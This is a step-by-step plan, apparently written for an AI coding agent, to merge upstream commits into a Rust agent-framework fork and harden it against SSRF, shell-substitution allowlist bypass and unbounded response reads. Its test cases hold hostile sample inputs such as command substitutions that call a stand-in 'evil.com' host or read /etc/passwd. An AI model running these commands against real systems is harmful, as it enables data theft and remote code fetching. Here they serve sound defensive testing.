# Upstream Merge + Security Hardening Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Merge 28 upstream commits from RightNow-AI/openfang, then fix 5 security/code issues — all verified with build/test/clippy gates.

**Architecture:** Phase 1 merges upstream into a dedicated branch, resolves 13 conflict files, and verifies the build. Phase 2 creates a security branch and fixes 5 issues (SSRF fail-open, exec allowlist bypass, unbounded response reads, ENV_MUTEX gaps, receipt eviction drift). Phase 3 runs full verification and ships via PR.

**Tech Stack:** Rust, `url` crate (already in workspace), reqwest, tokio, DashMap

---

## Phase 1: Upstream Merge

### Task 1: Create merge branch and merge upstream

**Files:**
- All — merge touches 182 files

**Step 1: Create the merge branch**

```bash
git checkout -b merge/upstream-2026-03-08
```

**Step 2: Merge upstream/main**

```bash
git merge upstream/main --no-edit
```

Expected: CONFLICT in 13 files. Do NOT abort.

**Step 3: Commit (after conflict resolution in Task 2)**

---

### Task 2: Resolve merge conflicts

**Files (13 conflicts):**
- `Cargo.lock`
- `crates/openfang-api/Cargo.toml`
- `crates/openfang-api/src/middleware.rs`
- `crates/openfang-api/src/routes.rs`
- `crates/openfang-api/static/js/pages/wizard.js`
- `crates/openfang-channels/src/discord.rs`
- `crates/openfang-channels/src/telegram.rs`
- `crates/openfang-kernel/src/kernel.rs`
- `crates/openfang-runtime/src/drivers/copilot.rs`
- `crates/openfang-runtime/src/drivers/mod.rs`
- `crates/openfang-runtime/src/drivers/openai.rs`
- `crates/openfang-runtime/src/embedding.rs`
- `crates/openfang-runtime/src/model_catalog.rs`

**Step 1: Resolve each conflict file**

Resolution strategy per file:

| File | Strategy |
|------|----------|
| `Cargo.lock` | Delete file, let cargo regenerate: `git checkout --theirs Cargo.lock` then `cargo update --workspace` |
| `openfang-api/Cargo.toml` | Keep both sides' dependency additions. Our fork added nothing new here — accept upstream with `git checkout --theirs crates/openfang-api/Cargo.toml` |
| `middleware.rs` | Open file, inspect conflict markers. Both sides added middleware. Keep both — upstream added rate limit config, ours added CORS changes. Merge manually. |
| `routes.rs` | **Largest conflict.** Open file, search for all `<<<<<<<` markers. Our fork added: goals endpoints, budget agent ranking, workflow error exposure. Upstream added: community endpoints, serde compat, agent identity, model catalog routes. Keep ALL from both sides. |
| `wizard.js` | Accept upstream changes (`git checkout --theirs`), our wizard changes were minimal. |
| `discord.rs` | Accept upstream (`git checkout --theirs`). Upstream added resilience, our changes were minor. |
| `telegram.rs` | Accept upstream (`git checkout --theirs`). Major upstream rewrite (186 lines). |
| `kernel.rs` | Manual merge. Our fork added: goals feature, delivery tracker. Upstream added: agent identity field, kernel improvements. Keep both. |
| `copilot.rs` | Accept upstream (`git checkout --theirs`). Our only change was timeout which upstream also addressed. |
| `drivers/mod.rs` | Manual merge. Both modified driver list. Keep both changes. |
| `openai.rs` | Manual merge. Upstream added 50+ lines resilience. Re-apply our TCP keepalive on top. |
| `embedding.rs` | Accept upstream (`git checkout --theirs`). Upstream refactored embeddings. |
| `model_catalog.rs` | Accept upstream (`git checkout --theirs`). Major upstream expansion (80+ lines). |

For each file with `--theirs`:
```bash
git checkout --theirs <filepath>
git add <filepath>
```

For manual merges: open file, resolve `<<<<<<<`/`=======`/`>>>>>>>` markers, `git add <filepath>`.

**Step 2: Regenerate Cargo.lock**

```bash
cargo update --workspace
```

**Step 3: Stage all resolved files**

```bash
git add -A
```

**Step 4: Commit the merge**

```bash
git commit -m "$(cat <<'EOF'
Merge upstream/main (28 commits) into fork

Includes: driver resilience, channel hardening, model catalog expansion,
community templates, A2A improvements, serde compat layer, agent identity,
think stripping, default resilience, and multiple bugfix batches.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

### Task 3: Verify merge build

**Step 1: Build**

```bash
cargo build --workspace --lib
```

Expected: SUCCESS (0 errors)

**Step 2: Run tests**

```bash
cargo test --workspace
```

Expected: All tests pass (1,767+)

**Step 3: Run clippy**

```bash
cargo clippy --workspace --all-targets -- -D warnings
```

Expected: 0 warnings

**Step 4: If any step fails**

Fix compilation errors, test failures, or clippy warnings. These are likely from conflict resolution mistakes. Read the error, find the conflict file, fix it, and re-run.

**Step 5: Commit any fixups**

```bash
git add -A && git commit -m "fix: post-merge build fixes"
```

---

### Task 4: Code review the merge

**Agent:** Critique agent

**Step 1: Review conflict resolutions**

For each of the 13 conflict files, verify:
- No code was dropped from either side
- No duplicate function definitions
- No orphaned imports
- `routes.rs` has all our endpoints (goals, budget agents, workflow errors) AND all upstream endpoints

**Step 2: Spot-check upstream features**

Verify these upstream additions are present and wired:
- Agent identity field in `types/src/agent.rs` and `kernel.rs`
- Serde compat layer in `types/src/serde_compat.rs`
- Model catalog expansion in `runtime/src/model_catalog.rs`
- A2A improvements in `runtime/src/a2a.rs`
- GitHub issue templates in `.github/`

**Step 3: Sign off or request fixes**

---

### Task 5: Merge to main

**Step 1: Fast-forward main**

```bash
git checkout main
git merge merge/upstream-2026-03-08
```

**Step 2: Verify**

```bash
cargo build --workspace --lib && cargo test --workspace && cargo clippy --workspace --all-targets -- -D warnings
```

Expected: All pass.

---

## Phase 2: Security Fixes

### Task 6: Create security branch and add `url` dependency

**Files:**
- Modify: `crates/openfang-runtime/Cargo.toml`

**Step 1: Create branch**

```bash
git checkout -b fix/security-hardening
```

**Step 2: Add `url` crate to runtime dependencies**

In `crates/openfang-runtime/Cargo.toml`, add under `[dependencies]`:

```toml
url = { workspace = true }
```

**Step 3: Verify it compiles**

```bash
cargo build -p openfang-runtime --lib
```

Expected: SUCCESS

**Step 4: Commit**

```bash
git add crates/openfang-runtime/Cargo.toml
git commit -m "$(cat <<'EOF'
chore: add url crate to runtime dependencies

Needed for proper URL parsing in SSRF protection.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

### Task 7: Fix 1 — Unified SSRF protection (fail-closed + userinfo stripping)

**Files:**
- Create: `crates/openfang-runtime/src/ssrf.rs`
- Modify: `crates/openfang-runtime/src/lib.rs`
- Modify: `crates/openfang-runtime/src/web_fetch.rs:176-271` (replace check_ssrf, is_private_ip, extract_host)
- Modify: `crates/openfang-runtime/src/host_functions.rs:125-176,315-328` (replace is_ssrf_target, is_private_ip, extract_host_from_url)

**Step 1: Write the failing tests**

Create `crates/openfang-runtime/src/ssrf.rs` with tests first:

```rust
//! Unified SSRF protection for all URL-fetching code paths.
//!
//! Provides a single `check_ssrf()` function used by both `web_fetch.rs`
//! (builtin tools) and `host_functions.rs` (WASM guest network calls).

use std::net::{IpAddr, ToSocketAddrs};

/// Check if a URL targets a private/internal network resource.
/// Blocks localhost, metadata endpoints, private IPs.
/// Fails CLOSED: if DNS resolution fails, the request is blocked.
/// Must run BEFORE any network I/O.
pub fn check_ssrf(url: &str) -> Result<(), String> {
    todo!()
}

/// Check if a URL is an SSRF target, returning serde_json error for WASM host functions.
pub fn check_ssrf_json(url: &str) -> Result<(), serde_json::Value> {
    check_ssrf(url).map_err(|msg| serde_json::json!({"error": msg}))
}

/// Extract host (without userinfo or path) from a URL for capability checking.
pub fn extract_host_for_capability(url: &str) -> String {
    todo!()
}

fn is_private_ip(ip: &IpAddr) -> bool {
    todo!()
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- Existing behavior (must still pass) ---

    #[test]
    fn test_blocks_localhost() {
        assert!(check_ssrf("http://localhost/admin").is_err());
        assert!(check_ssrf("http://localhost:8080/api").is_err());
    }

    #[test]
    fn test_blocks_private_ips() {
        assert!(check_ssrf("http://10.0.0.1/").is_err());
        assert!(check_ssrf("http://172.16.0.1/").is_err());
        assert!(check_ssrf("http://192.168.1.1/").is_err());
    }

    #[test]
    fn test_blocks_metadata_endpoints() {
        assert!(check_ssrf("http://169.254.169.254/latest/meta-data/").is_err());
        assert!(check_ssrf("http://metadata.google.internal/computeMetadata/v1/").is_err());
        assert!(check_ssrf("http://100.100.100.200/latest/meta-data/").is_err());
        assert!(check_ssrf("http://192.0.0.192/metadata/instance").is_err());
    }

    #[test]
    fn test_blocks_non_http_schemes() {
        assert!(check_ssrf("file:///etc/passwd").is_err());
        assert!(check_ssrf("ftp://internal.corp/data").is_err());
        assert!(check_ssrf("gopher://evil.com").is_err());
    }

    #[test]
    fn test_blocks_ipv6_localhost() {
        assert!(check_ssrf("http://[::1]/admin").is_err());
        assert!(check_ssrf("http://[::1]:8080/api").is_err());
    }

    #[test]
    fn test_blocks_zero_ip() {
        assert!(check_ssrf("http://0.0.0.0/").is_err());
    }

    #[test]
    fn test_allows_public_urls() {
        // These resolve to public IPs — should pass
        assert!(check_ssrf("https://example.com/").is_ok());
        assert!(check_ssrf("https://google.com/search?q=test").is_ok());
    }

    // --- NEW: Bypass prevention tests ---

    #[test]
    fn test_blocks_userinfo_bypass() {
        // http://anything@localhost/ — userinfo before hostname
        assert!(check_ssrf("http://user@localhost/admin").is_err());
        assert!(check_ssrf("http://user:pass@localhost:8080/api").is_err());
        assert!(check_ssrf("http://foo@169.254.169.254/latest/").is_err());
        assert!(check_ssrf("http://x@[::1]/").is_err());
    }

    #[test]
    fn test_fails_closed_on_dns_failure() {
        // Nonexistent TLD — DNS will fail. Must be BLOCKED, not allowed.
        assert!(check_ssrf("http://this-domain-does-not-exist.invalid/secret").is_err());
    }

    #[test]
    fn test_extract_host_strips_userinfo() {
        assert_eq!(extract_host_for_capability("http://user:pass@example.com/path"), "example.com:80");
        assert_eq!(extract_host_for_capability("https://token@api.github.com/repos"), "api.github.com:443");
    }

    #[test]
    fn test_extract_host_normal() {
        assert_eq!(extract_host_for_capability("http://example.com:8080/path"), "example.com:8080");
        assert_eq!(extract_host_for_capability("https://example.com/path"), "example.com:443");
        assert_eq!(extract_host_for_capability("http://[::1]:8080/path"), "[::1]:8080");
    }
}
```

**Step 2: Run tests to verify they fail**

```bash
cargo test -p openfang-runtime ssrf -- 2>&1 | head -20
```

Expected: FAIL — `todo!()` panics

**Step 3: Implement the unified SSRF module**

Replace the `todo!()` bodies in `crates/openfang-runtime/src/ssrf.rs`:

```rust
pub fn check_ssrf(url: &str) -> Result<(), String> {
    // Only allow http:// and https://
    if !url.starts_with("http://") && !url.starts_with("https://") {
        return Err("Only http:// and https:// URLs are allowed".to_string());
    }

    // Parse with url crate to properly handle userinfo, IPv6, etc.
    let parsed = url::Url::parse(url)
        .map_err(|e| format!("Invalid URL: {e}"))?;

    let hostname = parsed.host_str()
        .ok_or_else(|| "URL has no host".to_string())?;

    // Hostname-based blocklist (catches metadata endpoints before DNS)
    let blocked = [
        "localhost",
        "ip6-localhost",
        "metadata.google.internal",
        "metadata.aws.internal",
        "instance-data",
        "169.254.169.254",
        "100.100.100.200",
        "192.0.0.192",
        "0.0.0.0",
        "::1",
        "[::1]",
    ];
    // Strip brackets for comparison (url crate returns "::1" not "[::1]" for IPv6)
    let cmp_host = hostname.trim_start_matches('[').trim_end_matches(']');
    if blocked.iter().any(|b| {
        let b_trimmed = b.trim_start_matches('[').trim_end_matches(']');
        b_trimmed.eq_ignore_ascii_case(cmp_host)
    }) {
        return Err(format!("SSRF blocked: {hostname} is a restricted hostname"));
    }

    // Resolve DNS and check every returned IP.
    // FAIL CLOSED: if DNS resolution fails, block the request.
    let port = parsed.port_or_known_default().unwrap_or(80);
    let socket_addr = format!("{hostname}:{port}");
    let addrs = socket_addr.to_socket_addrs()
        .map_err(|e| format!("SSRF blocked: DNS resolution failed for {hostname}: {e}"))?;

    for addr in addrs {
        let ip = addr.ip();
        if ip.is_loopback() || ip.is_unspecified() || is_private_ip(&ip) {
            return Err(format!(
                "SSRF blocked: {hostname} resolves to private IP {ip}"
            ));
        }
    }

    Ok(())
}

pub fn check_ssrf_json(url: &str) -> Result<(), serde_json::Value> {
    check_ssrf(url).map_err(|msg| serde_json::json!({"error": msg}))
}

pub fn extract_host_for_capability(url: &str) -> String {
    if let Ok(parsed) = url::Url::parse(url) {
        let host = parsed.host_str().unwrap_or("unknown");
        let port = parsed.port_or_known_default().unwrap_or(80);
        format!("{host}:{port}")
    } else {
        url.to_string()
    }
}

fn is_private_ip(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => {
            let octets = v4.octets();
            matches!(
                octets,
                [10, ..] | [172, 16..=31, ..] | [192, 168, ..] | [169, 254, ..]
            )
        }
        IpAddr::V6(v6) => {
            let segments = v6.segments();
            (segments[0] & 0xfe00) == 0xfc00 || (segments[0] & 0xffc0) == 0xfe80
        }
    }
}
```

**Step 4: Register the module**

In `crates/openfang-runtime/src/lib.rs`, add:

```rust
pub mod ssrf;
```

**Step 5: Run tests to verify they pass**

```bash
cargo test -p openfang-runtime ssrf --
```

Expected: ALL PASS

**Step 6: Wire web_fetch.rs to use unified module**

In `crates/openfang-runtime/src/web_fetch.rs`:

- Remove functions: `check_ssrf` (lines 176-225), `is_private_ip` (lines 228-242), `extract_host` (lines 245-271)
- Change the import at top to add: `use crate::ssrf::check_ssrf;`
- Update `pub(crate) fn check_ssrf` call at line 47 — it now calls `crate::ssrf::check_ssrf` via the import
- Remove `use std::net::{IpAddr, ToSocketAddrs};` (no longer needed here)
- Update tests to use `crate::ssrf::check_ssrf` or remove duplicated tests (the ssrf module has its own)

**Step 7: Wire host_functions.rs to use unified module**

In `crates/openfang-runtime/src/host_functions.rs`:

- Remove functions: `is_ssrf_target` (lines 125-160), `is_private_ip` (lines 162-176), `extract_host_from_url` (lines 315-328)
- Replace `is_ssrf_target(url)` call (line 283) with `crate::ssrf::check_ssrf_json(url)`
- Replace `extract_host_from_url(url)` call (line 288) with `crate::ssrf::extract_host_for_capability(url)`
- Remove `use std::net::ToSocketAddrs;` if no longer needed

**Step 8: Run full test suite**

```bash
cargo test -p openfang-runtime
```

Expected: ALL PASS

**Step 9: Commit**

```bash
git add crates/openfang-runtime/src/ssrf.rs crates/openfang-runtime/src/lib.rs crates/openfang-runtime/src/web_fetch.rs crates/openfang-runtime/src/host_functions.rs
git commit -m "$(cat <<'EOF'
security: unify SSRF protection with fail-closed DNS and userinfo stripping

- Extract shared ssrf.rs module used by web_fetch.rs and host_functions.rs
- Use url::Url for proper parsing (handles userinfo, IPv6, edge cases)
- Fail CLOSED on DNS resolution failure (was silently allowing)
- Strip userinfo from URLs before hostname extraction
- Unified blocklist across both code paths (was inconsistent)

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

### Task 8: Fix 2 — Block shell metacharacters in exec allowlist

**Files:**
- Modify: `crates/openfang-runtime/src/subprocess_sandbox.rs:142-173`

**Step 1: Write the failing tests**

Add to the `#[cfg(test)] mod tests` in `subprocess_sandbox.rs`:

```rust
    #[test]
    fn test_allowlist_blocks_command_substitution() {
        let policy = ExecPolicy::default();
        // $() embeds commands invisible to extract_all_commands
        assert!(validate_command_allowlist("echo $(curl http://evil.com)", &policy).is_err());
        assert!(validate_command_allowlist("echo $(cat /etc/passwd)", &policy).is_err());
    }

    #[test]
    fn test_allowlist_blocks_backtick_substitution() {
        let policy = ExecPolicy::default();
        assert!(validate_command_allowlist("echo `curl http://evil.com`", &policy).is_err());
        assert!(validate_command_allowlist("echo `cat /etc/passwd`", &policy).is_err());
    }

    #[test]
    fn test_allowlist_blocks_process_substitution() {
        let policy = ExecPolicy::default();
        assert!(validate_command_allowlist("cat <(curl http://evil.com)", &policy).is_err());
        assert!(validate_command_allowlist("diff <(echo a) >(echo b)", &policy).is_err());
    }

    #[test]
    fn test_full_mode_allows_substitution() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        // Full mode should not restrict shell features
        assert!(validate_command_allowlist("echo $(whoami)", &policy).is_ok());
        assert!(validate_command_allowlist("echo `whoami`", &policy).is_ok());
    }

    #[test]
    fn test_allowlist_allows_dollar_var_references() {
        let mut policy = ExecPolicy::default();
        policy.allowed_commands.push("env".to_string());
        // $VAR (without parens) is NOT command substitution — should be allowed
        assert!(validate_command_allowlist("echo $HOME", &policy).is_ok());
        assert!(validate_command_allowlist("echo $PATH", &policy).is_ok());
    }
```

**Step 2: Run tests to verify they fail**

```bash
cargo test -p openfang-runtime test_allowlist_blocks_command_substitution -- 2>&1
```

Expected: FAIL (currently passes the dangerous commands through)

**Step 3: Implement the shell metacharacter check**

In `subprocess_sandbox.rs`, add a new function before `validate_command_allowlist`:

```rust
/// Check for shell metacharacters that can bypass allowlist validation.
/// These features embed commands that are invisible to static command extraction.
fn contains_shell_substitution(command: &str) -> Option<&'static str> {
    if command.contains("$(") {
        return Some("Command substitution $() is not allowed in allowlist mode. Use exec_policy.mode = 'full' if needed.");
    }
    if command.contains('`') {
        return Some("Backtick substitution is not allowed in allowlist mode. Use exec_policy.mode = 'full' if needed.");
    }
    if command.contains("<(") || command.contains(">(") {
        return Some("Process substitution is not allowed in allowlist mode. Use exec_policy.mode = 'full' if needed.");
    }
    None
}
```

Then modify `validate_command_allowlist` to call it in the `Allowlist` arm, BEFORE `extract_all_commands`:

```rust
        ExecSecurityMode::Allowlist => {
            // SECURITY: Reject shell substitution that can embed invisible commands
            if let Some(msg) = contains_shell_substitution(command) {
                return Err(msg.to_string());
            }
            let base_commands = extract_all_commands(command);
            // ... rest unchanged
        }
```

**Step 4: Run tests to verify they pass**

```bash
cargo test -p openfang-runtime allowlist --
```

Expected: ALL PASS (including new tests)

**Step 5: Commit**

```bash
git add crates/openfang-runtime/src/subprocess_sandbox.rs
git commit -m "$(cat <<'EOF'
security: block shell substitution in exec allowlist mode

Reject $(), backticks, and <()/>() in allowlist mode since these
embed commands invisible to static command extraction. Full mode
is unaffected. Clear error message directs users to full mode.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

### Task 9: Fix 3 — Response size limit for chunked responses

**Files:**
- Modify: `crates/openfang-runtime/src/web_fetch.rs:86-113`
- Modify: `crates/openfang-runtime/src/tool_runner.rs:1313-1328`

**Step 1: Fix web_fetch.rs**

Replace lines 93-113 in `web_fetch.rs` (the content_length check through body read):

```rust
        let status = resp.status();

        let max_bytes = self.config.max_response_bytes as u64;

        // Check Content-Length header first (fast reject)
        if let Some(len) = resp.content_length() {
            if len > max_bytes {
                return Err(format!(
                    "Response too large: {} bytes (max {})",
                    len, self.config.max_response_bytes
                ));
            }
        }

        let content_type = resp
            .headers()
            .get("content-type")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();

        // Read body with size guard — handles chunked/streaming responses
        // that lack Content-Length header
        let resp_bytes = resp
            .bytes()
            .await
            .map_err(|e| format!("Failed to read response body: {e}"))?;

        if resp_bytes.len() as u64 > max_bytes {
            return Err(format!(
                "Response too large: {} bytes (max {})",
                resp_bytes.len(), self.config.max_response_bytes
            ));
        }

        let resp_body = String::from_utf8_lossy(&resp_bytes).to_string();
```

**Step 2: Fix tool_runner.rs**

Replace lines 1319-1328 in `tool_runner.rs`:

```rust
    let status = resp.status();
    let max_bytes: u64 = 10 * 1024 * 1024; // 10MB

    // Check Content-Length header first (fast reject)
    if let Some(len) = resp.content_length() {
        if len > max_bytes {
            return Err(format!("Response too large: {len} bytes (max 10MB)"));
        }
    }

    // Read body with size guard — handles chunked responses without Content-Length
    let resp_bytes = resp
        .bytes()
        .await
        .map_err(|e| format!("Failed to read response body: {e}"))?;

    if resp_bytes.len() as u64 > max_bytes {
        return Err(format!(
            "Response too large: {} bytes (max 10MB)",
            resp_bytes.len()
        ));
    }

    let body = String::from_utf8_lossy(&resp_bytes).to_string();
```

**Step 3: Run tests**

```bash
cargo test -p openfang-runtime
```

Expected: ALL PASS

**Step 4: Commit**

```bash
git add crates/openfang-runtime/src/web_fetch.rs crates/openfang-runtime/src/tool_runner.rs
git commit -m "$(cat <<'EOF'
security: enforce response size limit for chunked/streaming responses

Previously only checked Content-Length header, which is absent for
chunked transfer encoding. Now also checks actual body size after
download via bytes(). Prevents memory exhaustion from large chunked
responses.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

### Task 10: Fix 4 — ENV_MUTEX consistency

**Files:**
- Modify: `crates/openfang-api/src/routes.rs` (4 call sites)

**NOTE:** Line numbers will shift after the upstream merge. Search for the actual patterns.

**Step 1: Find all unguarded set_var/remove_var calls**

```bash
grep -n 'std::env::set_var\|std::env::remove_var' crates/openfang-api/src/routes.rs
```

Identify lines that do NOT have `ENV_MUTEX.lock()` in the preceding 2-3 lines.

**Step 2: Wrap each unguarded call**

For each unguarded `std::env::set_var(...)` or `std::env::remove_var(...)`, wrap with:

```rust
{
    let _guard = ENV_MUTEX.lock().unwrap();
    unsafe { std::env::set_var(&var, &value); }
}
```

There should be 4 call sites to fix (may change after merge — verify with grep):
1. PATH refresh (Windows winget)
2. API key set
3. API key remove
4. GitHub token set

**Step 3: Run tests**

```bash
cargo test -p openfang-api
```

Expected: ALL PASS

**Step 4: Commit**

```bash
git add crates/openfang-api/src/routes.rs
git commit -m "$(cat <<'EOF'
fix: wrap all env var mutations with ENV_MUTEX

Four call sites were using set_var/remove_var without the ENV_MUTEX
guard, creating potential UB in multi-threaded async context.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

### Task 11: Fix 5 — Delivery receipt eviction loop

**Files:**
- Modify: `crates/openfang-kernel/src/kernel.rs:188-198`

**Step 1: Write the failing test**

Add to kernel tests (or create a new test near the `DeliveryTracker` impl):

```rust
#[test]
fn test_receipt_eviction_respects_global_cap() {
    let tracker = DeliveryTracker::new();
    let max = DeliveryTracker::MAX_RECEIPTS;
    let per_agent = 50; // small buckets
    let num_agents = (max / per_agent) + 20; // exceed global cap with many small buckets

    for i in 0..num_agents {
        let agent_id = AgentId(uuid::Uuid::new_v4());
        for _ in 0..per_agent {
            tracker.record(agent_id, openfang_channels::types::DeliveryReceipt {
                channel: "test".to_string(),
                recipient: format!("agent-{i}"),
                timestamp: chrono::Utc::now(),
                success: true,
                error: None,
            });
        }
    }

    let total: usize = tracker.receipts.iter().map(|e| e.value().len()).sum();
    assert!(
        total <= max,
        "Total receipts ({total}) should be <= MAX_RECEIPTS ({max})"
    );
}
```

**Step 2: Run test to verify it fails**

```bash
cargo test -p openfang-kernel test_receipt_eviction_respects_global_cap --
```

Expected: FAIL — total exceeds MAX_RECEIPTS

**Step 3: Fix the eviction logic**

Replace lines 188-198 in `kernel.rs` (the global cap section inside `fn record`):

```rust
        // Global cap: evict across buckets until total is within limit
        drop(entry);
        let total: usize = self.receipts.iter().map(|e| e.value().len()).sum();
        if total > Self::MAX_RECEIPTS {
            let mut remaining = total - Self::MAX_RECEIPTS;
            while remaining > 0 {
                if let Some(mut bucket) = self.receipts.iter_mut().next() {
                    let drain = remaining.min(bucket.value().len());
                    if drain == 0 {
                        break;
                    }
                    bucket.value_mut().drain(..drain);
                    remaining -= drain;
                } else {
                    break;
                }
            }
        }
```

**Step 4: Run test to verify it passes**

```bash
cargo test -p openfang-kernel test_receipt_eviction_respects_global_cap --
```

Expected: PASS

**Step 5: Run full kernel tests**

```bash
cargo test -p openfang-kernel
```

Expected: ALL PASS

**Step 6: Commit**

```bash
git add crates/openfang-kernel/src/kernel.rs
git commit -m "$(cat <<'EOF'
fix: loop delivery receipt eviction to enforce global cap

Single-bucket eviction could leave total above MAX_RECEIPTS when
the picked bucket had fewer entries than needed. Now loops across
buckets until total is within bounds.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Phase 3: Verification & Ship

### Task 12: Security review (Critique agent)

**Step 1: Review all 5 fixes against checklist**

- [ ] SSRF: `http://user@localhost/` is blocked
- [ ] SSRF: DNS failure returns error (not silent pass)
- [ ] SSRF: Both `web_fetch.rs` and `host_functions.rs` use `crate::ssrf::check_ssrf`
- [ ] Exec: `echo $(curl evil)` rejected in allowlist mode
- [ ] Exec: `echo hello` still works in allowlist mode
- [ ] Exec: Full mode still allows everything
- [ ] Response: `bytes().len()` check after download
- [ ] ENV: All `set_var`/`remove_var` calls wrapped with `ENV_MUTEX`
- [ ] Receipts: Eviction loops until total <= MAX_RECEIPTS

**Step 2: Verify no regressions in existing functionality**

- SSRF still allows public URLs
- Exec allowlist still allows safe_bins
- Web fetch still returns proper content
- Env mutation still works for settings API

---

### Task 13: Full verification gate (Test agent)

**Step 1: Build**

```bash
cargo build --workspace --lib
```

Expected: SUCCESS

**Step 2: Test**

```bash
cargo test --workspace
```

Expected: ALL PASS

**Step 3: Clippy**

```bash
cargo clippy --workspace --all-targets -- -D warnings
```

Expected: 0 warnings

**Step 4: Format check**

```bash
cargo fmt --all -- --check
```

Expected: No formatting issues

---

### Task 14: Live integration test (Prod agent)

**Step 1: Start daemon**

```bash
pkill -f openfang || true
sleep 3
cargo build --release -p openfang-cli
target/release/openfang start &
sleep 6
```

**Step 2: Health check**

```bash
curl -s http://127.0.0.1:4200/api/health
```

Expected: `{"status":"ok",...}`

**Step 3: Verify agents load**

```bash
curl -s http://127.0.0.1:4200/api/agents | python3 -m json.tool | head -20
```

Expected: Agent list with names and states

**Step 4: Cleanup**

```bash
pkill -f openfang || true
```

---

### Task 15: Create PR and merge

**Step 1: Push branch**

```bash
git push -u origin fix/security-hardening
```

**Step 2: Create PR**

```bash
gh pr create --title "Security hardening: SSRF, exec allowlist, response limits" --body "$(cat <<'EOF'
## Summary
- **SSRF**: Unified protection with fail-closed DNS, userinfo stripping, consistent blocklist
- **Exec allowlist**: Block $(), backticks, <()/>() in allowlist mode
- **Response size**: Enforce limit on chunked/streaming responses (no Content-Length)
- **ENV_MUTEX**: All set_var/remove_var calls now guarded
- **Receipt eviction**: Loop across buckets to enforce global cap

## Security Issues Fixed
1. (High) SSRF bypass via DNS failure (fail-open) and URL userinfo
2. (High) Exec allowlist bypass via shell command substitution
3. (Medium) Unbounded memory from chunked HTTP responses
4. (Medium) Inconsistent env var mutation concurrency
5. (Medium) Delivery receipt memory drift above cap

## Test plan
- [x] All existing tests pass (1,767+)
- [x] New SSRF tests: userinfo bypass, DNS fail-closed
- [x] New exec tests: $(), backticks, <()/>() blocked
- [x] New receipt test: global cap enforced
- [x] Live integration test: daemon starts, agents load
- [x] cargo clippy clean, cargo fmt clean

🤖 Generated with [Claude Code](https://claude.com/claude-code)
EOF
)"
```

**Step 3: Return PR URL**
